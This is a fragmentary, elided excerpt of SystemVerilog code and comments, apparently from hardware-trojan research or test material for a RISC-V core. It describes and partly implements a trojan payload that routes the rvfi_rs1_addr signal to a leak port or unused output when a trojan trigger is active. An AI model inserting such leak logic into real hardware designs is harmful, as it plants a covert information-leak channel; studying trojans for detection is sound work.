 ...
 * Payload: Route rvfi_rs1_addr to leak port
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        trojan_leak_data <= rvfi_rs1_addr;
    end
end
...
// ============================================================
// Information Leak: Route rvfi_rs1_addr to unused output
//
...
//   Replace: assign output_signal = trojan_active ? rvfi_rs1_addr : normal_value;